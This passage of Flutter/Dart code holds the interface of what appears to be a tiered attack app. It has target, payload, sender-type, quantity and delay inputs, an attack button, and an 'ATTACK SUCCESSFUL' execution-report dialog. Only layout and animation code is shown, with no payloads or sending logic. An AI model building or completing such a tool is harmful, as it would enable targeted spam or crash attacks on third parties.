                    decoration: BoxDecoration(
                      color: _cardColor,
                      borderRadius: BorderRadius.circular(16),
                      border: Border.all(color: _roseColor.withOpacity(0.2), width: 1),
                    ),
                    child: Text(
                      "This feature is only available for VIP, Owner, High Admin, Moderator, Founder users",
                      style: TextStyle(
                        color: Colors.white.withOpacity(0.6),
                        fontSize: 12,
                        fontFamily: 'Rajdhani',
                        fontWeight: FontWeight.w500,
                        height: 1.4,
                      ),
                      textAlign: TextAlign.center,
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
      );
    }

    return Scaffold(
      backgroundColor: _darkerBg,
      body: Stack(
        children: [
          _buildAnimatedBackground(),
          SafeArea(
            child: SingleChildScrollView(
              physics: const BouncingScrollPhysics(),
              child: FadeTransition(
                opacity: _fadeAnimation,
                child: SlideTransition(
                  position: _slideAnimation,
                  child: Column(
                    children: [
                      _buildNeonHeader(),
                      const SizedBox(height: 20),
                      Padding(
                        padding: const EdgeInsets.symmetric(horizontal: 20),
                        child: Column(
                          children: [
                            _buildUserProfileCard(),
                            const SizedBox(height: 16),
                            _buildTargetInputCard(),
                            const SizedBox(height: 16),
                            _buildPayloadSelectionCard(),
                            const SizedBox(height: 16),
                            _buildSenderTypeCard(),
                            const SizedBox(height: 16),
                            _buildQuantityDelayCard(),
                            const SizedBox(height: 16),
                            _buildStatusIndicators(),
                            const SizedBox(height: 24),
                            _buildAttackButton(),
                            const SizedBox(height: 24),
                            _buildFooter(),
                            const SizedBox(height: 30),
                          ],
                        ),
                      ),
                    ],
                  ),
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  @override
  void dispose() {
    _buttonController.dispose();
    _fadeController.dispose();
    _slideController.dispose();
    _glowController.dispose();
    _rotateController.dispose();
    _videoController.dispose();
    targetController.dispose();
    qtyController.dispose();
    delayController.dispose();
    super.dispose();
  }
}

// Custom success dialog for custom attack (Yellow-Black Version)
class CustomSuccessDialog extends StatefulWidget {
  final String target;
  final Map<String, dynamic> details;
  final VoidCallback onDismiss;

  const CustomSuccessDialog({
    super.key,
    required this.target,
    required this.details,
    required this.onDismiss,
  });

  @override
  State<CustomSuccessDialog> createState() => _CustomSuccessDialogState();
}

class _CustomSuccessDialogState extends State<CustomSuccessDialog> with TickerProviderStateMixin {
  late AnimationController _fadeController;
  late AnimationController _scaleController;
  late AnimationController _glowController;
  late Animation<double> _fadeAnimation;
  late Animation<double> _scaleAnimation;
  late Animation<double> _glowAnimation;
  bool _showDetails = false;

  // YELLOW-BLACK THEME
  final Color _glowColor1 = const Color(0xFFFFD54F);
  final Color _glowColor2 = const Color(0xFFFFB300);
  final Color _accentColor = const Color(0xFFFFC107);
  final Color _cardColor = const Color(0xFF0D0D0D);
  final Color _surfaceColor = const Color(0xFF121212);
  final Color _darkerBg = const Color(0xFF050505);

  @override
  void initState() {
    super.initState();

    _fadeController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 600),
    );

    _scaleController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 800),
    );

    _glowController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 2000),
    );
    _glowController.repeat(reverse: true);

    _fadeAnimation = Tween<double>(begin: 0.0, end: 1.0).animate(
      CurvedAnimation(parent: _fadeController, curve: Curves.easeOutCubic),
    );

    _scaleAnimation = Tween<double>(begin: 0.85, end: 1.0).animate(
      CurvedAnimation(parent: _scaleController, curve: Curves.elasticOut),
    );

    _glowAnimation = Tween<double>(begin: 0.4, end: 1.0).animate(
      CurvedAnimation(parent: _glowController, curve: Curves.easeInOutSine),
    );

    Future.delayed(const Duration(milliseconds: 300), () {
      if (mounted) {
        setState(() {
          _showDetails = true;
        });
        _fadeController.forward();
        _scaleController.forward();
      }
    });
  }

  @override
  void dispose() {
    _fadeController.dispose();
    _scaleController.dispose();
    _glowController.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    final screenSize = MediaQuery.of(context).size;
    final dialogWidth = screenSize.width * 0.9;
    final dialogHeight = screenSize.height * 0.55;

    return Dialog(
      backgroundColor: Colors.transparent,
      insetPadding: EdgeInsets.zero,
      child: ConstrainedBox(
        constraints: BoxConstraints(
          maxWidth: dialogWidth,
          maxHeight: dialogHeight,
        ),
        child: ClipRRect(
          borderRadius: BorderRadius.circular(28),
          child: BackdropFilter(
            filter: ImageFilter.blur(sigmaX: 20, sigmaY: 20),
            child: Container(
              width: dialogWidth,
              height: dialogHeight,
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  begin: Alignment.topLeft,
                  end: Alignment.bottomRight,
                  colors: [
                    _surfaceColor.withOpacity(0.96),
                    _cardColor.withOpacity(0.96),
                  ],
                ),
                borderRadius: BorderRadius.circular(28),
                border: Border.all(color: _glowColor1.withOpacity(0.35), width: 1.5),
                boxShadow: [
                  BoxShadow(color: _glowColor1.withOpacity(0.2), blurRadius: 40, spreadRadius: 4),
                ],
              ),
              child: Stack(
                children: [
                  Positioned(
                    top: 24,
                    left: 0,
                    right: 0,
                    child: Column(
                      children: [
                        AnimatedBuilder(
                          animation: _glowController,
                          builder: (context, _) {
                            return Container(
                              padding: const EdgeInsets.all(22),
                              decoration: BoxDecoration(
                                color: _cardColor,
                                shape: BoxShape.circle,
                                border: Border.all(color: _glowColor1.withOpacity(0.4), width: 1.5),
                                boxShadow: [
                                  BoxShadow(
                                    color: _glowColor1.withOpacity(0.4 * _glowAnimation.value),
                                    blurRadius: 35,
                                    spreadRadius: 4,
                                  ),
                                ],
                              ),
                              child: const Icon(FontAwesomeIcons.checkDouble, color: Color(0xFFFFD54F), size: 42),
                            );
                          },
                        ),
                        const SizedBox(height: 18),
                        ShaderMask(
                          shaderCallback: (bounds) => LinearGradient(
                            colors: [Color(0xFFFFD54F), Color(0xFFFFC107), Color(0xFFFFB300)],
                          ).createShader(bounds),
                          child: const Text(
                            "ATTACK SUCCESSFUL",
                            style: TextStyle(
                              color: Colors.white,
                              fontSize: 20,
                              fontWeight: FontWeight.w900,
                              fontFamily: 'Rajdhani',
                              letterSpacing: 3,
                            ),
                          ),
                        ),
                      ],
                    ),
                  ),
                  if (_showDetails)
                    Positioned(
                      top: 150,
                      left: 20,
                      right: 20,
                      bottom: 90,
                      child: FadeTransition(
                        opacity: _fadeAnimation,
                        child: ScaleTransition(
                          scale: _scaleAnimation,
                          child: Container(
                            padding: const EdgeInsets.all(18),
                            decoration: BoxDecoration(
                              color: _cardColor,
                              borderRadius: BorderRadius.circular(20),
                              border: Border.all(color: _glowColor1.withOpacity(0.12), width: 1),
                            ),
                            child: SingleChildScrollView(
                              child: Column(
                                crossAxisAlignment: CrossAxisAlignment.start,
                                children: [
                                  Row(
                                    children: [
                                      Container(
                                        padding: const EdgeInsets.all(8),
                                        decoration: BoxDecoration(
                                          color: _glowColor1.withOpacity(0.08),
                                          borderRadius: BorderRadius.circular(12),
                                          border: Border.all(color: _glowColor1.withOpacity(0.2), width: 1),
                                        ),
                                        child: const Icon(Icons.report, color: Color(0xFFFFD54F), size: 16),
                                      ),
                                      const SizedBox(width: 12),
                                      const Text(
                                        "EXECUTION REPORT",
                                        style: TextStyle(
                                          color: Colors.white,
                                          fontSize: 13,
                                          fontWeight: FontWeight.w800,
                                          fontFamily: 'Rajdhani',
                                          letterSpacing: 2,
                                        ),
                                      ),
                                    ],
                                  ),
                                  const SizedBox(height: 16),
                                  _buildDetailRow("Target", widget.target),
                                  const SizedBox(height: 8),
                                  _buildDetailRow("Sender Type", widget.details["senderType"]?.toString() ?? "Global"),
                                  const SizedBox(height: 8),
                                  _buildDetailRow("Payloads", widget.details["bugs"]?.toString() ?? "Custom"),
                                  const SizedBox(height: 8),
                                  _buildDetailRow("Quantity", widget.details["qty"]?.toString() ?? "5"),
                                  const SizedBox(height: 8),
                                  _buildDetailRow("Delay", "${widget.details["delay"] ?? 100}ms"),
                                ],
                              ),
                            ),
                          ),
                        ),
                      ),
                    ),
                  Positioned(
                    bottom: 24,
                    left: 24,
                    right: 24,
                    child: GestureDetector(
                      onTap: widget.onDismiss,
                      child: Container(
                        height: 50,
                        decoration: BoxDecoration(
                          color: _glowColor1.withOpacity(0.92),
                          borderRadius: BorderRadius.circular(14),
                          boxShadow: [
                            BoxShadow(color: _glowColor1.withOpacity(0.3), blurRadius: 20),
                          ],
                        ),
                        child: const Center(
                          child: Text(
                            "DISMISS",
                            style: TextStyle(
                              fontSize: 13,
                              fontWeight: FontWeight.w900,
                              fontFamily: 'Rajdhani',
                              letterSpacing: 3,
                              color: Color(0xFF0A0A0A),
                            ),
                          ),
                        ),
                      ),
                    ),
                  ),
                ],
              ),
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildDetailRow(String label, String value) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 4),
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          SizedBox(
            width: 85,
            child: Text(
              "[$label]",
              style: TextStyle(
                color: Colors.white.withOpacity(0.45),
                fontSize: 11,
                fontFamily: 'Rajdhani',
                fontWeight: FontWeight.w600,
              ),
            ),
          ),
          Expanded(
            child: Text(
              value,
              style: TextStyle(
                color: _glowColor1,
                fontSize: 11,
                fontWeight: FontWeight.w700,
                fontFamily: 'Rajdhani',
                letterSpacing: 0.5,
              ),
            ),
          ),
        ],
      ),
    );
  }
}